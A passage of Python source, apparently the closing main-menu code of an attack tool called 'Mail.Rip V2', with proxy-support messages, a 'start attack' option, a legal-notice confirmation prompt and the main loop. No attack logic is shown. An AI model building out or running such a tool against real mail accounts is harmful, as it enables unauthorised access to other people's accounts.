                  + f'\nProxy-support has been activated using {str(type_socks)} proxys.' + f'{p1}')
        else:
            input(Fore.RED + '\n\nWARNING\n' + '-'*7 + '\nProxy-support is still deactivated.' + f'{p1}')

    # option 4 / start attack:
    elif option == '4':
        startattack()

    # any other input / restart:
    else:
        clean()
        input(Fore.YELLOW + 'INFO\n' + '-'*4 + '\nNo option entered.' + f'{p1}')

    return None

# clean screen, print legal notices:
clean()
print(Fore.RED + legal_logo)
legal_confirm = input('CONFIRM WITH [ENTER] OR TYPE "NO":    ' + Fore.YELLOW).lower()

# exit if not confirmed:
if legal_confirm.startswith('n'):
    clean()
    sys.exit(Fore.RED
             + '\nLegal Notices not confirmed.\nMail.Rip V2 cannot be used without confirming the '
             + '<< Legal Notices >>.\n\n')
else: pass

# start main menu:
while 1:
    mainmenu()

# DrPython3 (C) 2021 @ GitHub.com
